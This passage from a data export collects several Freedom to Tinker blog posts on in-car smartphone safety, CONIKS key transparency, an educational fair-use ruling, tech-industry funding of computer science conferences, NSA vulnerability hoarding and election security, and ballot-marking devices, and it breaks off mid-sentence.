touchscreen. This gives you an an experience that’s engineered for safe use in the car: simplified interfaces with large buttons and extensive voice recognition support. Android Auto, for example, provides specific APIs for third-party developers that want to implement music or messaging apps, wherein those apps can’t do much more than tweak the colors and icons. Only built-in apps from Google are allowed to do more; everything else from third-party developers is forbidden. Furthermore, your phone’s screen is “locked out” when it’s connected to the car. The driver get a limited but safe experience. How safe? These systems from Apple and Google are specifically engineered to meet Federal requirements with regard to minimum font size, maximum distraction time, and so forth. Below is a photo of a Google engineer styling some “occlusion glasses”, wherein they test whether desired functions can be accomplished with only a quick glance. More on Android Auto’s compliance with regulatory requirements can be found in a Google I/O video from 2014, starting around 17 minutes in. Suffice to say that Google and Apple are investing serious resources to solve the problem. What about older cars? Some degree of retrofitting is available via third-party head units, but those tend to be expensive, higher-end models. Regardless, market forces and the general turnover of older cars will eventually take care of the problem, with virtually every car manufacturer already shipping these features today. Furthermore, car manufacturers and others could certainly engineer more affordable console upgrades to their older cars, and a modest amount of regulation could help nudge them along. How about a tax credit to replace an old car stereo with a new one that supports Android Auto and Apple CarPlay? Save lives and get a better car stereo at the same time? Score! Rather than trying to ban texting in cars and use invasive “textalyzer” magic wands to enforce it, let’s instead take engineering steps to solve the essential problem of safely interacting with a smartphone while driving. With better engineering of the automotive smartphone experience, drivers will be happier, privacy will be preserved, and all it will cost is making more engineers rock those stylish glasses."
"31","2016-03-31","2023-03-24","https://freedom-to-tinker.com/2016/03/31/why-making-johnnys-key-management-transparent-is-so-challenging/","In light of the ongoing debate about the importance of using end-to-end encryption to protect our data and communications, several tech companies have announced plans to increase the encryption in their services. However, this isn’t a new pledge: since 2014, Google and Yahoo have been working on a browser plugin to facilitate sending encrypted emails using their services. Yet in recent weeks, some have criticized that only alpha releases of these tools exist, and have started asking why they’re still a work in progress. One of the main challenges to building usable end-to-end encrypted communication tools is key management. Services such as Apple’s iMessage have made encrypted communication available to the masses with an excellent user experience because Apple manages a directory of public keys in a centralized server on behalf of their users. But this also means users have to trust that Apple’s key server won’t be compromised or compelled by hackers or nation-state actors to insert spurious keys to intercept and manipulate users’ encrypted messages. The alternative, and more secure, approach is to have the service provider delegate key management to the users so they aren’t vulnerable to a compromised centralized key server. This is how Google’s End-To-End works right now. But decentralized key management means users must “manually” verify each other’s keys to be sure that the keys they see for one another are valid, a process that several studies have shown to be cumbersome and error-prone for the vast majority of users. So users must make the choice between strong security and great usability. In August 2015, we published our design for CONIKS, a key management system that addresses these usability and security issues. CONIKS makes the key management process transparent and publicly auditable. To evaluate the viability of CONIKS as a key management solution for existing secure communication services, we held design discussions with experts at Google, Yahoo, Apple and Open Whisper Systems, primarily over the course of 11 months (Nov ‘14 – Oct ‘15). From our conversations, we learned about the open technical challenges of deploying CONIKS in a real-world setting, and gained a better understanding for why implementing a transparent key management system isn’t a straightforward task. Overview of CONIKS In CONIKS, communication service providers (e.g. Google, Apple) run centralized key servers so that users don’t have to worry about encryption keys, but the main difference is CONIKS key servers store the public keys in a tamper-evident directory that is publicly auditable yet privacy-preserving. On a regular basis, CONIKS key servers publish directory summaries, which allow users in the system to verify they are seeing consistent information. To achieve this transparent key management, CONIKS uses various cryptographic mechanisms that leave undeniable evidence if any malicious outsider or insider were to tamper with any key in the directory and present different parties different views of the directory. These consistency checks can be automated and built into the communication apps to minimize user involvement. Why deploying transparent key management is difficult In addition to the strong security and privacy features, CONIKS is also designed to be efficient in terms of computational resources for clients and servers; CONIKS seems like an attractive choice for anyone looking to deploy a transparent key management system for their encrypted communication service. So, are we done? While our proof-of-concept secure chat application worked well in our experiments, we wanted to know if major online communication service providers would consider CONIKS to be a viable key management system. From our discussions with the engineers at Google, Yahoo, Apple and Open Whisper Systems, we identified five main challenges posing major barriers to a practical deployment of CONIKS. 1. Collaboration and interoperability. Our original idea was that all CONIKS key servers would collaborate by auditing each other’s key directories, since this would make the consistency checks done by the communication app more efficient. But in reality, collaboration is hampered by the fact that there are two types of communication services: centralized services (or “walled gardens”) such as iMessage and Signal, and federated protocols such as SMTP (email) or XMPP (instant messaging). By design, these services can’t all interoperate. The main challenge for walled gardens is then to find third-party auditors the service provider and its users are willing to trust. On the other hand, federated services that interoperate for communication could still agree to audit each other, but this requires additional standardization of formats for the data used to ensure key transparency. We learned these engineers would largely support standardizing the transparency protocols, but also that establishing any standard in general often involves evaluating a number of existing deployments of the system, which can be a long process as multiple interested parties come to an agreement. 2. Maintaining trust in the provider. Most engineers commended CONIKS’ ability to detect tampering and inconsistent views of a key directory. However, they were concerned CONIKS makes it difficult to attribute an inconsistency to the proper source, because key servers digitally sign all published data so that there’s no question who published it. Auditors have no way of determining whether an inconsistency was introduced by an outside attacker who compromised the key server, a system error, or a malicious employee. Because of this ambiguity, users may lose trust in the key server and migrate to a different communication provider whose transparent key server hasn’t exhibited any inconsistency, or worse, a provider that doesn’t support transparency at all. This is an undesirable outcome for any service provider. Is there a way the provider can recover from accidental inconsistencies? A full recovery would require being able to prove the source of an inconsistency, which stands in direct conflict with the current design of CONIKS. Building a high-assurance key server that uses formal verification and secure hardware would minimize server bugs, but would still not solve the problem of distinguishing between changes made by a single malicious employee from changes due to outside compromise or coercion. 3. Key loss and account recovery. In an early version of CONIKS, once a key was bound to a specific username, this key could only change with authorization of the owner using the key that was being replaced. Unlike passwords, which may be recovered when lost, there is no way to recover data encrypted for a lost key, which means a user would lose access to her account. As a result of our early discussions, in which engineers suggested a more user-friendly approach, we designed a default account recovery mechanism for CONIKS: unauthorized key changes. However, this mechanism undermines users’ security since it doesn’t leave cryptographic evidence and other app clients have no way of distinguishing account recovery from a compromised account. The engineers viewed developing a more secure account recovery mechanism, in which it’s unambiguously clear who initiated the recovery, as one of the main barriers to deploying CONIKS. While key loss is also a problem in other applications such as Bitcoin wallets, we haven’t explored whether the solutions in those domains could apply to CONIKS. 4. Proactive attack prevention. The fact that CONIKS’ key servers publish directory summaries at set time intervals allows app clients to establish a clear linear history of the directory. While these summaries provide strong cryptographic proof when a provider has published inconsistent views of its directory, publishing this proof at these intervals also means attacks can only be detected after they have already happened. From our discussions, we learned these strong detection guarantees may still be insufficient for some secure communication providers, as they leave an open (yet brief) window for attack. Finding a practical solution that is proactive and can mitigate the risks of key server compromise, instead of detecting attacks after-the-fact, remains an open problem. The biggest challenge: Effective user warnings Even with the above challenges solved, engineers still face one significant barrier: false positives will cause the app client to issue warnings prompting the user about a possible attack. For example, the client will detect an unexpected key if the user adds a new device or re-installs the app to recover a lost account, as well as when the key server maliciously changes the user’s key without proper authorization. Similarly, a warning will be issued for inconsistent directory summaries, but these may stem from time synchronization problems between the server and the client, or from an attempt by a malicious key server to publish different views of its directory. Users are notorious for ignoring security warnings, so malicious CONIKS key servers may get away with attacks. In cases such as the fake account recovery, the attack leaves no hard evidence, so it’s crucial for the app client to be able to distinguish between the innocuous causes for warnings and the attacks. But even then, can we design the user interface to convey clearly to users when it’s important for their security to take action on a warning? Much like other security-critical applications, a significant challenge to deploying transparent key management is to design security warnings that are effective even for users without knowledge of the underlying encryption and protocols. What lies ahead We are very thankful to the engineers for having taken the time to review our design for CONIKS and to exchange ideas about possible improvements. Our discussions were instrumental in revealing the design challenges we hadn’t considered in our research on CONIKS, and we hope shedding light on these open problems will inform future research on usable security and practical key management. But more importantly, speaking with engineers working on Google End-to-End, Yahoo End-to-End, iMessage, and Signal provided us with a first-hand perspective of the technical challenges of deploying transparent key management and usable encryption tools. Not only is this a lens through which we as academic researchers had a rare opportunity to view a system we developed, it also gave us a better appreciation for the engineering effort and time that finding a practical solution to all of these open deployment challenges requires. We have also been in contact with a few smaller secure communication service providers, most notably Tor Messenger, with whom we’ve discussed their plans to deploy CONIKS as part of their systems. Although these small providers largely face the same challenges, we believe their smaller (and often more niche) user base lowers the barrier to adoption of a system like CONIKS. Unfortunately, we have no concrete information on when CONIKS will reach practical deployment. However, with the ongoing debate about encryption-by-default and backdoors, and the fact that transparent key management can provide hard evidence of coercion by nation-state actors, we suspect the pressure to deploy a system like CONIKS has never been greater. CONIKS has provided the first steps towards transparency and is changing how communication service providers are thinking about key management. But overcoming the remaining barriers isn’t a minor endeavor. While some of these tech companies have had a slow start, we hope the renewed public interest and attention on end-to-end encryption will shift the focus to their usable encryption tools. We also hope this debate can provide further proof of the importance of key transparency to the companies that have been releasing usable encryption tools for several years. The engineers who have been working on all of these tools are incredibly dedicated and passionate about solving these open problems, and we’re optimistic that transparent key management is within our reach."
"32","2014-10-23","2023-03-24","https://freedom-to-tinker.com/2014/10/23/four-fair-use-takeaways-from-cambridge-university-press-v-patton/","The most important copyright and educational fair use case in recent memory (mine, at least) was decided by the Eleventh Circuit Court of Appeals last week. The case, Cambridge University Press v. Patton, challenged Georgia State University’s use of e-reserves in courses offered by the university. The copyrighted works at issue were scholarly books–i.e., a mix of monographs, edited volumes, and portions thereof–not textbooks. This case is important because of its broad applicability to similarly situated academic institutions throughout the country that routinely engage in the same practices for which GSU was sued. It’s also important because the court’s decision re-articulated and faithfully followed some foundational fair use principles from prior case law. Readers of the case who are proponents of a vigorous fair use doctrine shouldn’t be disheartened by the fact that the Eleventh Circuit reversed the district court’s ruling in favor of GSU and remanded the case for reconsideration. Ultimately, this case is good news for educational fair use. Here are four reasons why: 1) The court made it clear that the implied license that comes to secondary users by operation of law through the doctrine of fair use is not negated by a secondary user’s failure to obtain an express license from the copyright owner, even in cases where a paid license from the copyright owner can be readily obtained. Nor does failure to obtain a paid license from the copyright owner convert a non-profit secondary use into a commercial use, notwithstanding the fact that the secondary user indirectly profits from the uncompensated use by saving the money s/he would otherwise have spent on a license. 2) The court emphasized that there are no shortcuts through the fair use analysis. Each of the four statutory factors, explained here in an earlier post, must be analyzed in a way that is tailored to the circumstances of each particular case. No mechanical weighing of factors is permitted, and no arbitrary quantitative thresholds for borrowing can be enshrined (e.g., 10%, which was the amount the district court erroneously held to be a legally meaningful benchmark). In rejecting the 10% threshold, the court went out of its way to say that the “Classroom Guidelines” memorialized in the legislative history of the 1976 Copyright Act and advocated by the plaintiffs as an upper limit on permissible borrowing “do not carry force of law.” Moreover, the court said, to the extent that the Guidelines serve any persuasive legal function, they suggest a floor rather than a ceiling for how much borrowing is fair. 3) Although the court declined to expand the concept of “transformativeness” to cover GSU’s allegedly infringing use of portions of the plaintiffs’ works, it held that a secondary user’s failure to transform the underlying work in the act of borrowing is not damning if the use is for education. [W]e are persuaded that, despite the recent focus on transformativeness under the first factor, use for teaching purposes by a nonprofit, educational institution such as [GSU] favors a finding of fair use under the first factor, despite the nontransformative nature of the use. More transformation is better, in other words, but lack of transformation doesn’t end the inquiry. 4) The court distinguished GSU’s non-profit use of copyrighted works from the for-profit uses that were at issue in the famous “coursepack cases” from the 1990s, which held that Kinko’s and other commercial copyshops were not protected by fair use for their preparation and sale of instructor-compiled collegiate coursepacks. Cambridge University Press argued that the coursepack cases should dictate the outcome for GSU, but the court disagreed."
"33","2022-03-23","2023-03-24","https://freedom-to-tinker.com/2022/03/23/recommendations-for-introducing-greater-safeguards-and-transparency-into-cs-conference-funding/","In Part 1 of this piece, I provided evidence of the extent to which some of the world’s top computer science conferences are financially reliant upon some of the world’s most powerful technology companies. In this second part, I lay out a set of recommendations for ways to help ensure that these entanglements of industry and academia don’t grant companies undue influence over the conditions of knowledge creation and exchange. To be clear, I am not suggesting that conferences stop accepting money from tech companies, nor am I saying there is no place for Big Tech investment in academic research. I am simply advocating for conference organizers to adopt greater safeguards to increase transparency and mitigate the potential agenda-setting effects associated with companies’ funding of and presence in academic spaces. While I am not claiming that sponsors have any say over which papers are or aren’t published, in the next few paragraphs I will show how agenda-setting can happen in a much more subtle yet pervasive way. Resurrecting conferences as “trading zones” Setting the agenda in a given field means determining and prioritizing topics of focus and investment. Research priorities are not neutral or naturally occurring—they are the result of social and political construction. And because a great deal of CS funding comes from tech companies, these priorities are likely to be shaped by what is considered valuable or profitable to those companies. An example of the tech industry’s agenda-setting power includes the way in which AI/ML research has been conceptualized in narrower terms to prioritize technical work. For instance, despite its valuable contributions to the understanding of priorities inherent in ML research, the Birhane et. al. paper I cited in Part 1 was rejected from publication at the 2021 NeurIPS Conference with a dismissive meta-review, which is just one example of how the ML community has marginalized critical work and elevated technical work. Other examples of corporate agenda-setting in CS include the aforementioned way in which tech companies’ definitions of privacy and security vary from those of consumer advocates, and the way in which the field of human-computer interaction (HCI) often focuses on influencing user behavior rather than stepping back to reflect on necessary systemic changes at the platform level. In deciding which conferences to fund, and shaping which ideas and work get elevated within those conferences, tech companies contribute to the creation of a prestige hierarchy. This, in turn, influences which kinds of people who self-select into submitting their work to and attending those conferences. Further, the sponsorship perks afford companies a prominent presence at CS conferences through expos and other events. Combined, these factors mold CS conferences into sites of commercially oriented activity. It is important to make space at top conferences for work that doesn’t necessarily advance commercial innovation. Beyond simply serving as a channel for publishing and broadcasting academic papers, conferences have the potential to serve as sites of critique, activism and advocacy. These seemingly secondary functions of academic gatherings are, in actuality, critical functions that need to be preserved. In “Engaging, Designing and Making Digital Systems,” Janet Vertesi et al. describe spaces of collaboration between scholarship and design as “trading zones”, where engagements can be corporate, critical, inventive, or focused on inquiry. While corporate work engages from within companies, critical engagement requires the existence of a trading zone in which domain scientists, computer scientists and engineers can meet and engage in dialogue. Vertesi et al. write, “Critical engagements typically embrace intersections between IT research and corporations yet eschew immediate pay-offs for companies or designers.” Even if sponsoring companies don’t have a direct hand in deciding which work gets published, their presence at academic conferences gives them both insight into ideas and work being shared among attendees, and opportunities to push specific messaging around their brand through advertising and recruitment events. Therefore, instituting sponsorship policies and increasing transparency would help to both curb their potential influence, as well as make clear to conference participants the terms of companies’ financial contributions. Introducing greater safeguards around conference sponsorship would not be unprecedented; for example, there have been similar efforts in the medical community to curb the influence of pharmaceutical and medical device manufacturing companies on clinical conferences. Asking accountability conferences to practice what they preach In particular, tech conferences whose mission is explicitly related to ethics and accountability deserve a higher level of scrutiny for their donor relationships. However, my survey of some of the most prominent conferences in this space found that many of them do not provide a list of donors, nor do they disclose any sponsorship policies on their websites. That said, some conferences have been reevaluating their fundraising practices after recognizing that certain sponsors’ actions were not aligning with their values. For example, in March 2021, the ACM Conference for Fairness, Accountability, and Transparency (FAccT) suspended its sponsorship relationship with Google in protest of the company’s firing of two of its top Ethical AI researchers, who had been examining biases built into the company’s AI systems. FAccT committee member Suresh Venkatasubramanian tweeted that the decision to drop Google as a supporter was “in the best interests of the community” while the committee revised its sponsorship policy. Conference sponsorship co-chair Michael Ekstrand told VentureBeat that having Google as a sponsor could impede FAccT’s Strategic Plan. (It should be noted that FAccT still accepted funding from DeepMind, a subsidiary of Google’s parent company Alphabet, for its 2021 conference.) The conference recently published a new sponsorship policy, acknowledging that “outside contributions raise serious concerns about the independence of the conference and the legitimacy that the conference may confer on sponsors and supporters.” Other conferences, like the ACM Conference on Equity and Access in Algorithms, Mechanisms, and Optimization (EAAMO) and the Association for Computational Linguistics (ACL) Conference have also posted sponsorship and/or conflict of interest policies on their websites. While it might be expected that ethics and fairness-oriented conferences would have a more robust protocol around which funds they accept, it is in the best interest of all CS conferences to think critically about and mitigate the constraints associated with accepting corporate sponsorship. Recommendation of Best Practices In many instances, accepting corporate sponsorship is a necessary evil that enables valuable work to be done and allows greater access to resources and opportunities like conferences. In the long term, there should be a concerted effort to resurrect computer science conferences as a neutral territory for academic exploration based on what scholars, not corporations, deem to be worthy of pursuit. However, a more immediate solution could be to establish and enforce a series of best practices to ensure greater academic integrity of conferences that do rely on corporate sponsorship. Many scholars, like those who signed the Funding Matters petition in 2018, have argued in favor of establishing rigorous criteria and guidelines for corporate sponsorship of research conferences. I have developed a set of recommendations for conferences to serve as a jumping-off point for ensuring greater transparency and accountability in their decision-making process: Evaluate sponsors through the lens of your organization’s mission and values. Determine which lines you’re not willing to cross. Are there companies whose objectives or outputs run counter to your values? Are there actions you refuse to legitimize or companies whose reputation might significantly compromise the integrity of the conferences they fund? Review your existing sponsors to ensure that none of them are crossing that line, and use it as a threshold for determining whether to accept funding from others in the future. For example, in the sponsorship policy for the ACM Conference on Equity and Access in Algorithms, Mechanisms, and Optimization (EAAMO), organizers reserve the right to “decline or return any funding should the sponsorship committee decide that the funding source is misaligned with the mission of the initiative and conference.” Be transparent about who is sponsoring your conference, how much they are contributing, and what benefits they receive as a condition of their contributions. While many conferences do list the logos of their sponsors on their websites, it is not often clear how much money those organizations gave and how exactly it was used. To ensure greater transparency, publish a list of sponsors on your website and in other promotional materials and make the details of your call for sponsorship publicly available and easily accessible. Make sure to make this information public ahead of the conference, so that invited speakers and other attendees can make an informed decision about whether or not they want to participate. (1) Develop rigorous policies to prevent sponsors from influencing the content or speakers of conference events. Establish a solid gift acceptance policy and thorough gift agreement outlining the kinds of funding you will and will not accept to ensure that your donors’ support is not restricted and does not come with strings attached. For example, the FAccT conference recently published a new statement outlining their practices around sponsorship and financial support, which denies sponsors say over any part of the conference organization or content. In addition, sponsors can only contribute to a general fund, rather than being able to specify how their contributions are used. Encourage open discussion during the conference about the implications of accepting corporate funding and potential alternatives. For example, the ACM Conference on Computer Science and Law has committed to devoting time to a “discussion of practical strategies for and ethical implications of different funding models for both research and conference sponsorship in the nascent ACM Computer Science and Law community.” Make sure the industry in general, or any one company in particular, is not over-represented among sponsors or conference organizers Consider whether certain sponsors might be working to whitewash or silence certain areas of research. What are the interests or intentions of the organization offering you sponsorship funds? What do they hope to gain from this relationship? (2) For example, the EEAMO sponsorship committee commits to “seek[ing] funding from a diverse set of sources which may include academic institutions, charitable organizations, foundations, industry, and government sources.” Consider seeking alternative, industry-independent sources of funding whose interests are less likely to conflict with the subject/mission of your conference. That being said, it is important to bear in mind that, as Phan et al. pointed out in their recent paper, “philanthropic foundation funding from outside Big Tech interests present different and complex considerations for researchers as producers and suppliers of ethics work.” This is why having a diversity of sources is preferable. In working to reclaim conferences as a space of academic exploration untainted by corporate interests, the field of computer science can help to ensure that their research is better positioned to serve the best interests of the public. (1) Several speakers backed out of their scheduled appearances at the UCLA Institute for Technology, Law & Policy’s November 2021 Power and Accountability in Tech conference after learning the center had accepted sponsorship money from the Koch Foundation, which has funded attacks on antiracist scholarship. (2) For example, in 2016, the Computer, Privacy, & Data Protection Conference (CPDP) chose to stop accepting sponsorship funding from Palantir after participants like Aral Balkan pulled out of a panel and described CPDP’s acceptance of the company’s contributions as “privacy-washing”. Many thanks, once again, to Prof. Arvind Narayanan for his guidance and support."
"34","2022-03-11","2023-03-24","https://freedom-to-tinker.com/2022/03/11/the-tech-industry-controls-cs-conference-funding-what-are-the-dangers/","Research about the influence of computing technologies, such as artificial intelligence (AI), on society relies heavily upon the financial support of the very companies that produce those technologies. Corporations like Google, Microsoft, and IBM spend millions of dollars each year to sponsor labs, professorships, PhD programs, and conferences in fields like computer science (CS) and AI ethics at some of the world’s top institutions. Industry is the main consumer of academic CS research, and 84% of CS professors receive at least some industry funding. All of these factors contribute to the significant influence tech firms wield over the kinds of questions that are and aren’t asked about their products, and which information is and isn’t made available about their social impact. As consciousness about these conflicts of interest builds, we are seeing growing calls from scholars in and around CS to disentangle the discipline from Big Tech’s corporate agenda. However, given the extent to which much of CS academia relies on funding from major tech corporations, this is much easier said than done. As I argue below, a more achievable yet valuable goal might be to introduce better safeguards in spaces like conferences to mitigate undue corporate influence over essential research. I will make my case in two parts. First, in today’s post, I will: Provide a quick overview of discourse regarding Big Tech’s dominance in CS research, and Use a dataset I’ve compiled to illustrate the extent to which conferences—an essential arena for knowledge sharing in the field of computer science—are financially reliant upon some of the world’s most powerful technology companies. In my second post, I will follow up with my recommendations for steps that can be taken to minimize the potential chilling or agenda-setting effects brought on by corporate funding on CS research. A short survey of concerns about Big Tech’s influence Relying on large companies and the resources they control can create significant limitations for the kinds of CS research that are proposed, funded and published. The tech industry plays a large hand in deciding what is and isn’t worthy of examination, or how issues are framed. For instance, a tech company might have a very different definition of privacy from that which is used by consumer rights advocates. But if the company is determining the parameters for the kinds of research it wishes to sponsor, it can choose to fund proposals that align with or uphold its own interpretation. The scope of what is reasonable to study is therefore shaped by what is of value to tech companies. There is little incentive for these corporations to fund academic research about issues that they consider more marginal or which don’t relate to their priorities. A 2020 study on artificial intelligence research found that “with respect to AI, firms have increased corporate research significantly,” in the form of both company-level publications as well as collaborations with elite universities. This trend was illustrated in an analysis by Birhane et al. of top-cited papers published at premier machine learning conferences, which revealed “substantive and increasing corporate presence” in that research. In 2018-19, nearly 80% of the annotated papers had some sort of corporate ties, by either author affiliation or funding. Moreover, the analysis found that corporate presence is more pronounced in the conference papers that end up receiving the most citations. Birhane et al. write, “the top stated values of ML… such as performance, generalization, and efficiency may not only enable and facilitate the realization of Big Tech’s objectives, but also suppress values such as beneficence, justice, and inclusion.” One of the most vocal critics of Big Tech’s “capture” of CS academia is Meredith Whittaker, a former Google employee-turned Senior Advisor on AI at the Federal Trade Commission. She argues that tech companies, hoping to muffle critics and fend off mounting regulatory pressure, are eager to shape the narrative around their technologies’ social impact by funding favorable research. This has led to widespread corporate sponsorship of labs, faculty positions, graduate programs, and conferences—all of which are reliant on these companies for not only funding, but often also access to data and computing resources. This industry capture of tech research—wherein corporations are strategically funding research or public campaigns in a way that serves their own agenda—has been described by scholars like Thao Phan et al. as “philanthrocapitalism.” Furthermore, as Whittaker argues, the tech industry’s dominance in CS research “threatens to deprive frontline communities, policymakers, and the public of vital knowledge about the costs and consequences of AI and the industry responsible for it—right at the time that this work is most needed.” Recognizing this threat, other ex-Googlers like Timnit Gebru and Alex Hanna have taken the initiative to launch the Distributed AI Research Institute, in an effort to create space for “independent, community-rooted AI research free from Big Tech’s pervasive influence.” I do wish to make clear that receiving funding from an organization that doesn’t completely align with one’s values does not necessarily mean one’s research is compromised. Corporate funding of AI research is not inherently bad, and academics who do not accept Big Tech money can still produce ethically questionable research. Furthermore, individuals who accept Big Tech funding can still be critical of the corporations’ products and their influence on society. However, I agree with academics like Moshe Y. Vardi who argue that we must grapple with the contradictions inherent in accepting funding for research such as AI ethics from companies whose interests may run counter to the public good. In a recent article, Vardi, who is the senior editor of Communications of the ACM(1), urged his colleagues to think more critically about their field’s relationship to “surveillance-capitalism corporations”, writing: “The biggest problem that computing faces today is not that AI technology is unethical—though machine bias is a serious issue—but that AI technology is used by large and powerful corporations to support a business model that is, arguably, unethical.” Analysis: FAAMG companies dominate conference sponsorship One way to begin to address these conflicts of interest is by reflecting on the conditions of knowledge creation and exchange—in spaces such as academic conferences—and thinking critically and openly about the compromises and tradeoffs inherent in accepting funding from the industry that controls the subject of one’s study. In the field of computer science, conferences are the primary venue for sharing one’s research with others in the discipline. Therefore, sponsoring these gatherings gives firms valuable influence over and insight into what’s happening at the cutting edge of topics like machine learning and human-computer interaction. In an effort to get a better understanding of who the major players are in this realm, I reviewed the websites for the top 25 CS conferences (based on H-5 index and impact score) to compile information about all of the organizations that have financially supported them between 2019 and 2021. I found that a majority of the most frequent and most generous sponsors, often donating tens of thousands of dollars per conference, were powerful technology companies. This spreadsheet contains sponsorship data for the top 25 most frequent sponsors (2). Of the 10 sponsors who supported the largest numbers of different conferences in the past three years, five are “FAAMG” companies (Facebook, Apple, Amazon, Microsoft, Google)—six if you count DeepMind, a subsidiary of Google’s parent company Alphabet. No non-profit organizations, government science funding agencies, or sponsors from outside the U.S. or China appeared among the top 10. Overall, among the most frequent and most generous supporters of the top 25 CS conferences, the only non-tech/non-corporate donor was the National Science Foundation, which sponsored five different conferences (11 total gatherings) with donations typically ranging between $15,000 and $25,000. In addition to having their company name and logo listed on conference promotional materials, top sponsors (who often give upwards of $50,000) receive perks such as opportunities to sponsor prizes or students grants, complimentary registrations and private meeting rooms, access to databases of conference registrants interested in recruitment opportunities, virtual booths or priority exhibition spaces, advertising opportunities and press support, and access to attendee metrics on “exhibitor dashboards”. A “Hero Sponsor” who gave $50,000 or more to the 2021 Conference on Human Factors in Computing Systems (CHI), for example, would have received 34 different benefits – which cumulatively create opportunities for continuous access to and influence on attendees throughout the event. It is difficult to get an accurate estimate of exactly how much money each company donates to these conferences, as these numbers are not consistently reported to the public. Some conferences only publish a list of supporters with no details about how much each one gave. Others assign sponsorship levels such as “Platinum” or “Diamond”, but the monetary value associated with each level varies by conference and year. When dollar amounts are provided, they often represent a potential range of several thousand dollars—for instance, a Platinum Sponsor of the 2021 SIGMOD/PODS conference might have given anywhere between $16,000 and $31,999. Furthermore, it is difficult gain insight into how exactly these funds are used. Given the extent of financial entanglement between Big Tech and academia, it might be unrealistic to expect CS scholars to completely resist accepting any industry funding—instead, it may be more practicable to make a concerted effort to establish higher standards for and greater transparency regarding sponsorship. In Part 2 of this article, I will recommend steps that can be taken to minimize the potential chilling or agenda-setting effects brought on by corporate funding on CS research. (1) Six of the top 25 CS conferences in the world are organized by ACM, the Association for Computing Machinery. Between 2019 and 2021, many of those conferences were largely funded by American tech companies like Apple, Amazon, Facebook, Google, IBM, and Microsoft, and Chinese ones like Alibaba, Baidu, ByteDance, and Huawei. (2) I have compiled a conference sponsorship database that includes extensive data that is not included in this spreadsheet. If you are interested in reviewing it, or in collaborating on further data collection, I would be happy to share it privately. Many, many thanks to Prof. Arvind Narayanan and Karen Rouse for their thoughtful guidance on and support with this piece."
"35","2016-08-18","2023-03-24","https://freedom-to-tinker.com/2016/08/18/security-against-election-hacking-part-2-cyberoffense-is-not-the-best-cyberdefense/","State and county election officials across the country employ thousands of computers in election administration, most of them are connected (from time to time) to the internet (or exchange data cartridges with machines that are connected). In my previous post I explained how we must audit elections independently of the computers, so we can trust the results even if the computers are hacked. Still, if state and county election computers were hacked, it would be an enormous headache and it would certainly cast a shadow on the legitimacy of the election. So, should the DHS designate election computers as “critical cyber infrastructure?” This question betrays a fundamental misunderstanding of how computer security really works. You as an individual buy your computers and operating systems from reputable vendors (Apple, Microsoft, IBM, Google/Samsung, HP, Dell, etc.). Businesses and banks (and the Democratic National Committee, and the Republican National Committee) buy their computers and software from the same vendors. Your security, and the security of all the businesses you deal with, is improved when these hardware and software vendors build products without security bugs in them. Election administrators use computers that run Windows (or MacOS, or Linux) bought from the same vendors. Parts of the U.S. government, particularly inside the NSA, have “cyberdefense” teams that analyze widely used software for security vulnerabilities. The best thing they could do to enhance our security is notify the vendors immediately about vulnerabilities, so the vendors can fix the bugs (and learn their lessons). Unfortunately, the NSA also has “cyberoffense” teams that like to save up these vulnerabilities, keep them secret, and use them as weak points to break into their adversaries’ computers. They think they’re so smart that the Russkies, or the Chinese, will never be able to figure out the same vulnerabilities and use them to break into the computers of American businesses, individuals, the DNC or RNC, or American election administrators. There’s even an acronym for this fallacy: NOBUS. “NObody But US” will be able to figure out this attack. Vulnerability lists accumulated by the NSA and DHS probably don’t include a lot of vote-counting software: those lists (probably) focus on widely used operating systems, office and word-processing, network routers, phone apps, and so on. But vote-counting software typically runs on widely used operating systems, uses PDF-handling software for ballot printing, network routers for vote aggregation. Improvements in these components would improve election security. So, the “cyberdefense” experts in the U.S. Government could improve everyone’s security, including election administrators, by promptly warning Microsoft, Apple, IBM, and so on about security bugs. But their hands are often tied by the “cyberoffense” hackers who want to keep the bugs secret—and unfixed. For years, independent cybersecurity experts have advocated that the NSA’s cyberdefense and cyberoffense teams be split up into two separate organizations, so that the offense hackers can’t deliberately keep us all insecure. Unfortunately, in February 2016 the NSA did just the opposite: it merged its offense and defense teams together. Some in the government talk as if “national cyberdefense” is some kind of “national guard” that they can send in to protect a selected set of computers. But it doesn’t work that way. Our computers are secure because of the software we purchase and install; we can choose vendors such as Apple, IBM, Microsoft, HP, or others based on their track record or based on their use of open-source software that we can inspect. The DHS’s cybersecurity squad is not really in that process, except as they help the vendors improve the security of their products. (See also: “The vulnerabilities equities process.”) Yes, it’s certainly helpful that the Secretary of Homeland Security has offered “assistance in helping state officials manage risks to voting systems in each state’s jurisdiction.” But it’s too close to the election to be fiddling with the election software—election officials (understandably) don’t want to break anything. But really we should ask: Should the FBI and the NSA be hacking us or defending us? To defend us, they must stop hoarding secret vulnerabilities, and instead get those bugs fixed by the vendors."
"36","2022-12-14","2023-03-24","https://freedom-to-tinker.com/2022/12/14/next-steps-for-mercer-county-following-voting-machine-failure/","Hand-marked optical-scan paper ballots are the most secure form of voting: with any other method, if the computerized voting machines are hacked, there’s no trustworthy paper trail from which we can determine the true outcome of the election, based on the choices that voters actually indicated. Even those voting methods that appear to have a paper trail, if it’s a computer that created the paper trail, it’s less trustworthy. And that’s the case even if the human voters have an opportunity to look at the paper, as I will explain below. Mercer County, NJ uses hand-marked paper ballots in its election-day polling places. That’s good. But after the system-wide voting-machine failure in Mercer County, some county officials are thinking of abandoning hand-marked paper ballots, and using Ballot Marking Devices (BMDs) in polling places. That would be a bad idea: BMDs can never be as secure as hand-marked paper ballots. The use of BMDs can lead to unrecoverable election failures. In contrast, Mercer County’s failure was recoverable: Even though the voting machines failed to work on election day, voters could (and did) hand-mark the same paper ballots that they would have fed into those voting machines, and the Board of Elections could (and did) count those ballots with their high-speed central-count optical scanners. Although Mercer uses hand-marked paper ballots for election-day precincts, the county uses BMD-marked paper ballots for early vote centers. I voted at an early vote center in Princeton (Mercer County) on November 2. I was checked in on a Tenex e-pollbook and sent to a Dominion ICX touchscreen ballot-marking device (BMD) where I selected candidates on a touchscreen; then the BMD printed out a double-sided optical-scan ballot with the ovals filled in. I reviewed my ballot to make sure they were filled in as I had indicated on the touchscreen. Then, as instructed, I fed that into a Dominion ICP2 optical-scan voting machine, which tallied the votes and dropped my paper ballot into a ballot box, available for recounts or for audits. Voting with BMDs is a bad idea. Like any computerized voting machines, ballot-marking devices can be hacked to make them cheat. In fact, we know for sure that Dominion ICX machines can be hacked; see this advisory from the U.S Cybersecurity and Infrastructure Security Agency. (But I expect that BMDs sold by other companies such as ES&S or Clearballot likely have similar vulnerabilities.) When a BMD is hacked, that means that the attacker can make it 